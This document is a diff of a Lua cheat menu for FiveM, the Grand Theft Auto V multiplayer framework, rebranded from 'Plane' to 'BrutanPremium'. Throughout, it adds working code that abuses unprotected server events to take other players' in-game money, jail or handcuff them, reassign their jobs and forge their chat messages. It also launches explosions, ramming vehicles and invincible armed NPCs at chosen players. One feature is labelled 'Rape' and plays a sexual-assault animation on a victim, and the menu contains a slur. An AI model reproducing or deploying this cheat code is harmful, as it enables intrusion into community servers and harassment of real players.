                         local d=KeyboardInput("Enter amount of money to steal","",100)
                         if d ~= "" then
                             TriggerServerEvent("esx:removeInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                         end
-                    elseif Plane.Button("ESX Handcuff Player") then
+                    elseif BrutanPremium.Button("ESX Handcuff Player") then
                         TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
-                    elseif Plane.Button("ESX Send To Jail") then
+                    elseif BrutanPremium.Button("ESX Send To Jail") then
                         TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
                            TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                            TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                         TriggerServerEvent("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
-                    elseif Plane.Button("ESX Get Out Of Jail") then
+                    elseif BrutanPremium.Button("ESX Get Out Of Jail") then
                         local ped = selectedPlayer
                         TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                         TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
@@ -5430,34 +7781,310 @@ Citizen.CreateThread(
                         TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                     end
 
-                    Plane.Display()
-                elseif Plane.IsMenuOpened("PlayerESXJobMenu") then
-                    if Plane.Button("Unemployed") then
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerESXJobMenu") then
+                    if BrutanPremium.Button("Unemployed") then
                         TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
-                    elseif Plane.Button("Police") then
+                    elseif BrutanPremium.Button("Police") then
                         TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"police",3)
-                    elseif Plane.Button("Mechanic") then
+                    elseif BrutanPremium.Button("Mechanic") then
                         TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"mecano",3)
-                    elseif Plane.Button("Taxi") then
+                    elseif BrutanPremium.Button("Taxi") then
                         TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"taxi",3)
-                    elseif Plane.Button("Ambulance") then
+                    elseif BrutanPremium.Button("Ambulance") then
                         TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"ambulance",3)
-                    elseif Plane.Button("Real Estate Agent") then
+                    elseif BrutanPremium.Button("Real Estate Agent") then
                         TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"realestateagent",3)
-                    elseif Plane.Button("Car Dealer") then
+                    elseif BrutanPremium.Button("Car Dealer") then
                         TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"cardealer",3)
                     end
 
 
-                    Plane.Display()
-                elseif Plane.IsMenuOpened("PlayerTrollMenu") then
-                    if Plane.Button ("Fake Chat Message") then
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerTrollMenu") then
+                    if BrutanPremium.Button ("Fake Chat Message") then
                         local cX=KeyboardInput("Enter message to send","",100)
                         local cY=GetPlayerName(selectedPlayer)
                         if cX then
                             TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
                         end
-				elseif Plane.Button("Spawn Mountain Lion") then
+				elseif BrutanPremium.Button("Ram w/ Custom Vehicle") then
+				local cPs = KeyboardInput('Are you sure you want to ram the player? y/n', '', 0)
+				if cPs == 'y' then
+						local ModelName1 = KeyboardInput("Enter Vehicle Name", "", 100)
+				        if ModelName1 and IsModelValid(ModelName1) and IsModelAVehicle(ModelName1) then
+                        local model = GetHashKey(ModelName1)
+                        RequestModel(model)
+                        while not HasModelLoaded(model) do
+                            Citizen.Wait(0)
+                        end
+                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
+                        if HasModelLoaded(model) then
+                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
+                            SetVehicleForwardSpeed(veh, 120.0)		
+                        end		
+											                    else
+                        drawNotification("~r~Model Isn't Valid You Tard")
+						end
+						elseif cPs == 'n' then
+                        drawNotification(
+                            '~h~~r~Operation cancelled~s~.'
+                        )
+					    else
+                        drawNotification(
+                            '~h~~r~Invalid Confirmation~s~.'
+                        )
+                        drawNotification(
+                            '~h~~r~Operation cancelled~s~.'
+                        )
+                    end
+				elseif BrutanPremium.Button('~y~Explode ~s~Vehicle') then
+                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
+                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
+                    else
+                        av('~h~~b~Player not in a vehicle~s~.', false)
+                    end
+                elseif BrutanPremium.Button('~r~Banana ~p~Party') then
+                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
+                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
+                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
+                    AttachEntityToEntity(
+                        bH,
+                        GetPlayerPed(SelectedPlayer),
+                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
+                        0.4,
+                        0,
+                        0,
+                        0,
+                        270.0,
+                        60.0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                    AttachEntityToEntity(
+                        bI,
+                        GetPlayerPed(SelectedPlayer),
+                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
+                        0.4,
+                        0,
+                        0,
+                        0,
+                        270.0,
+                        60.0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                    AttachEntityToEntity(
+                        bJ,
+                        GetPlayerPed(SelectedPlayer),
+                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
+                        0.4,
+                        0,
+                        0,
+                        0,
+                        270.0,
+                        60.0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                elseif BrutanPremium.Button('~r~ISIS Explode') then
+                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
+                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
+				elseif BrutanPremium.Button("Small invisible Explosion") then
+                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
+                elseif BrutanPremium.Button('~r~Rape') then
+                    RequestModelSync('a_m_o_acult_01')
+                    RequestAnimDict('rcmpaparazzo_2')
+                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
+                        Citizen.Wait(0)
+                    end
+                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
+                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
+                        while not NetworkHasControlOfEntity(veh) do
+                            NetworkRequestControlOfEntity(veh)
+                            Citizen.Wait(0)
+                        end
+                        SetEntityAsMissionEntity(veh, true, true)
+                        DeleteVehicle(veh)
+                        DeleteEntity(veh)
+                    end
+                    count = -0.2
+                    for b = 1, 3 do
+                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
+                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
+                        SetEntityAsMissionEntity(bS, true, true)
+                        AttachEntityToEntity(
+                            bS,
+                            GetPlayerPed(SelectedPlayer),
+                            4103,
+                            11816,
+                            count,
+                            0.00,
+                            0.0,
+                            0.0,
+                            0.0,
+                            0.0,
+                            false,
+                            false,
+                            false,
+                            false,
+                            2,
+                            true
+                        )
+                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
+                        TaskPlayAnim(
+                            GetPlayerPed(SelectedPlayer),
+                            'rcmpaparazzo_2',
+                            'shag_loop_poppy',
+                            2.0,
+                            2.5,
+                            -1,
+                            49,
+                            0,
+                            0,
+                            0,
+                            0
+                        )
+                        SetPedKeepTask(bS)
+                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
+                        SetEntityInvincible(bS, true)
+                        count = count - 0.4
+                    end
+                elseif BrutanPremium.Button('~r~Cage ~s~Player') then
+                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local e7 = 'prop_fnclink_05crnr1'
+                    local e8 = GetHashKey(e7)
+                    RequestModel(e8)
+                    while not HasModelLoaded(e8) do
+                        Citizen.Wait(0)
+                    end
+                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
+                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
+                    SetEntityHeading(e9, -90.0)
+                    SetEntityHeading(ea, 90.0)
+                    FreezeEntityPosition(e9, true)
+                    FreezeEntityPosition(ea, true)
+                elseif BrutanPremium.Button('Wall ~s~Player') then
+                    local eb = 'xs_prop_hamburgher_wl'
+                    local ec = -145066854
+                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                    AttachEntityToEntity(
+                        ed,
+                        GetPlayerPed(SelectedPlayer),
+                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
+                        0,
+                        0,
+                        -1.0,
+                        0.0,
+                        0.0,
+                        0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                elseif BrutanPremium.Button('Wall ~s~Player Car') then
+                    local eb = 'xs_prop_hamburgher_wl'
+                    local ec = -145066854
+                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                    AttachEntityToEntity(
+                        ed,
+                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
+                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
+                        0,
+                        0,
+                        -1.0,
+                        0.0,
+                        0.0,
+                        0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                elseif BrutanPremium.Button('Fuck Up ~s~Player') then
+                    j = true
+                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local ee = 'sr_prop_spec_tube_xxs_01a'
+                    local ef = GetHashKey(ee)
+                    RequestModel(ef)
+                    RequestModel(smashhash)
+                    while not HasModelLoaded(ef) do
+                        Citizen.Wait(0)
+                    end
+                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false)
+                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
+                    local eh = -356333586
+                    local bR = 'WEAPON_SNOWBALL'
+                    for i = 0, 10 do
+                        local bK = GetEntityCoords(eg)
+                        RequestModel(eh)
+                        Citizen.Wait(50)
+                        if HasModelLoaded(eh) then
+                            local ped =
+                                CreatePed(
+                                21,
+                                eh,
+                                bK.x + math.sin(i * 2.0),
+                                bK.y - math.sin(i * 2.0),
+                                bK.z - 5.0,
+                                0,
+                                true,
+                                true
+                            ) and
+                                CreatePed(
+                                    21,
+                                    eh,
+                                    bK.x - math.sin(i * 2.0),
+                                    bK.y + math.sin(i * 2.0),
+                                    bK.z - 5.0,
+                                    0,
+                                    true,
+                                    true
+                                )
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(500)
+                                NetToPed(ei)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetCurrentPedWeapon(ped, GetHashKey(bR), true)
+                                SetEntityInvincible(ped, true)
+                                SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+				elseif BrutanPremium.Button("Spawn Mountain Lion") then
                     local mtlion = "A_C_MtLion"
                     for i = 0, 10 do
                         local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
@@ -5482,7 +8109,7 @@ Citizen.CreateThread(
                             end
                         end
                     end
-                elseif Plane.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
+                elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
                     local bQ = "s_m_y_swat_01"
                     local bR = "WEAPON_ASSAULTRIFLE"
                     for i = 0, 10 do
@@ -5512,7 +8139,7 @@ Citizen.CreateThread(
                             end
                         end
                     end
-					elseif Plane.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
+					elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                     local bQ = "s_m_y_swat_01"
                     local bR = "weapon_rpg"
                     for i = 0, 10 do
@@ -5543,7 +8170,7 @@ Citizen.CreateThread(
                         end
                     end
 					
-                elseif Plane.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
+                elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                     local bQ = "s_m_y_swat_01"
                     local bR = "weapon_flaregun"
                     for i = 0, 10 do
@@ -5573,7 +8200,7 @@ Citizen.CreateThread(
                             end
                         end
                     end
-                elseif Plane.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
+                elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                     local bQ = "s_m_y_swat_01"
                     local bR = "weapon_railgun"
                     for i = 0, 10 do
@@ -5603,40 +8230,60 @@ Citizen.CreateThread(
                             end
                         end
                     end
-                    elseif Plane.Button("Cage Player") then
-                        freezePlayer = true
-                        Citizen.Wait(10)
-                        SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
-                        freezePlayer = false
-                    elseif Plane.MenuButton("Spawn Props On Player", "SpawnPropsMenu") then
-                    elseif Plane.CheckBox(
+					elseif BrutanPremium.Button("Rain Agressive NPC") then
+                    local bQ = "mp_f_cocaine_01"
+					local bR = "weapon_knife"
+					for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
+							NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+								SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+						end
+                    end
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
+                    elseif BrutanPremium.CheckBox(
                         "Freeze Player",
                         freezePlayer,
                         function(enabled)
                             freezePlayer = enabled
                         end)
                     then
-                    elseif Plane.Button("Small invisible Explosion") then
-                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
-                    elseif Plane.Button("~b~Isis Explosion") then
-                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
                     end
 
-                    Plane.Display()
-                elseif Plane.IsMenuOpened("SpawnPropsMenu") then
-                    if Plane.CheckBox(
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("SpawnPropsMenu") then
+                    if BrutanPremium.CheckBox(
                         "Attach Prop To Player",
                         attachProp,
                         function(enabled)
                             attachProp = enabled
                         end)
                     then
-                    elseif Plane.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
+                    elseif BrutanPremium.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                         currentBone = currentIndex
                         selectedBone = selectedIndex
                     end)
                     then
-                    elseif Plane.Button("Weed") then
+                    elseif BrutanPremium.Button("Weed") then
                         local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                         local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
                         if attachProp then
@@ -5646,7 +8293,7 @@ Citizen.CreateThread(
                                 AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                             end
                         end
-                    elseif Plane.Button("UFO") then
+                    elseif BrutanPremium.Button("UFO") then
                         local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                         local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
                         if attachProp then
@@ -5656,7 +8303,7 @@ Citizen.CreateThread(
                                 AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                             end
                         end
-                    elseif Plane.Button("Windmill") then
+                    elseif BrutanPremium.Button("Windmill") then
                         local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                         local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
                         if attachProp then
@@ -5666,7 +8313,7 @@ Citizen.CreateThread(
                                 AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                             end
                         end
-                    elseif Plane.Button("Custom Prop") then
+                    elseif BrutanPremium.Button("Custom Prop") then
                         local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                         local input = KeyboardInput("Enter Prop Name", "", 100)
                         if IsModelValid(input) then
@@ -5683,9 +8330,9 @@ Citizen.CreateThread(
                         end
                     end
 
-                    Plane.Display()
-            elseif Plane.IsMenuOpened("VehicleRamMenu") then
-                if Plane.Button("Futo") then
+                    BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("VehicleRamMenu") then
+                if BrutanPremium.Button("Futo") then
                     local model = GetHashKey("futo")
                     RequestModel(model)
                     while not HasModelLoaded(model) do
@@ -5696,7 +8343,7 @@ Citizen.CreateThread(
                         local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                         SetVehicleForwardSpeed(veh, 120.0)
                     end
-                elseif Plane.Button("Bus") then
+                elseif BrutanPremium.Button("Bus") then
                     local model = GetHashKey("bus")
                     RequestModel(model)
                     while not HasModelLoaded(model) do
@@ -5710,81 +8357,88 @@ Citizen.CreateThread(
                 end
 
 
-                    Plane.Display()
-            elseif Plane.IsMenuOpened("SingleWepPlayer") then
+                    BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("SingleWepPlayer") then
                 for i = 1, #allWeapons do
-                    if Plane.Button(allWeapons[i]) then
-                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
+                    if BrutanPremium.Button(allWeapons[i]) then
+                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, true)
                     end
                 end
 
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("WeaponMenu") then
-                if Plane.MenuButton("Single Weapon Spawner", "SingleWeaponMenu") then
-                elseif Plane.Button("Give All Weapons") then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("WeaponMenu") then
+                if BrutanPremium.MenuButton("~r~→  ~s~Single Weapon Spawner", "SingleWeaponMenu") then
+                elseif BrutanPremium.Button("Give All Weapons") then
                     for i = 1, #allWeapons do
-                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
+                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                     end
-                elseif Plane.Button("Remove All Weapons") then
+                elseif BrutanPremium.Button("Remove All Weapons") then
                     for i = 1, #allWeapons do
                         RemoveAllPedWeapons(PlayerPedId(), true)
                     end
-                elseif Plane.Button("Give Ammo") then
+                elseif BrutanPremium.Button("Give Ammo") then
                     for i = 1, #allWeapons do
                         AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250)
                     end
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "No Reload",
-                    InfClip,
+                    dwadawdwd,
                     function(enabled)
-                        InfClip = enabled
-                        SetPedInfiniteAmmoClip(PlayerPedId(), InfClip)
+                        dwadawdwd = enabled
+                        SetPedInfiniteAmmoClip(PlayerPedId(), dwadawdwd)
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Infinite Ammo",
-                    InfAmmo,
+                    JYGNDJ,
                     function(enabled)
-                        InfAmmo = enabled
-                        SetPedInfiniteAmmo(PlayerPedId(), InfAmmo)
+                        JYGNDJ = enabled
+                        SetPedInfiniteAmmo(PlayerPedId(), JYGNDJ)
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Explosive Ammo",
-                    explosiveAmmo,
+                    bifegfubffff,
                     function(enabled)
-                        explosiveAmmo = enabled
+                        bifegfubffff = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Oneshot",
                     Oneshot,
                     function(enabled)
                         Oneshot = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
-                    "Delete Gun",
-                    DeleteGun,
+				elseif BrutanPremium.CheckBox(
+                    "No Recoil",
+                    NOXJDSS,
                     function(enabled)
-                        DeleteGun = enabled
+                        NOXJDSS = enabled
                     end)
                 then
-                elseif Plane.MenuButton("Weapon Customization", "WeaponCustomization") then
-                elseif Plane.MenuButton("Bullet Gun Options", "BulletGunMenu") then
+                elseif BrutanPremium.CheckBox(
+                    "Delete Gun",
+                    WADOHWIB,
+                    function(enabled)
+                        WADOHWIB = enabled
+                    end)
+                then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Bullet Gun Options", "BulletGunMenu") then
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("WeaponCustomization") then
-                if Plane.CheckBox(
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("WeaponCustomization") then
+                if BrutanPremium.CheckBox(
                     "Rainbow Tint",
                     rainbowTint,
                     function(enabled)
                         rainbowTint = enabled
                     end)
                 then
-                elseif Plane.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
+                elseif BrutanPremium.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                     currentTint = currentIndex
                     selectedTint = selectedIndex
 
@@ -5814,7 +8468,7 @@ Citizen.CreateThread(
                     end
                 end)
                 then
-                elseif Plane.Button("~g~Add Special Finish") then
+                elseif BrutanPremium.Button("~g~Add Special Finish") then
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
@@ -5827,7 +8481,7 @@ Citizen.CreateThread(
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
-                elseif Plane.Button("~r~Remove Special Finish") then
+                elseif BrutanPremium.Button("~r~Remove Special Finish") then
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
@@ -5840,26 +8494,26 @@ Citizen.CreateThread(
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
-                elseif Plane.Button("~g~Add Suppressor") then
+                elseif BrutanPremium.Button("~g~Add Suppressor") then
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
-                elseif Plane.Button("~r~Remove Suppressor") then
+                elseif BrutanPremium.Button("~r~Remove Suppressor") then
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
-                elseif Plane.Button("~g~Add Scope") then
+                elseif BrutanPremium.Button("~g~Add Scope") then
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
-                elseif Plane.Button("~r~Remove Scope") then
+                elseif BrutanPremium.Button("~r~Remove Scope") then
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
@@ -5868,46 +8522,46 @@ Citizen.CreateThread(
                     RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("BulletGunMenu") then
-                if Plane.CheckBox(
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("BulletGunMenu") then
+                if BrutanPremium.CheckBox(
                     "Vehicle Gun",
                     vehicleGun,
                     function(enabled)
                         vehicleGun = enabled
                     end)
                 then
-                elseif Plane.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
+                elseif BrutanPremium.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                     currentVehicle = currentIndex
                     selectedVehicle = selectedIndex
 
                 end)
                 then
-                elseif Plane.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
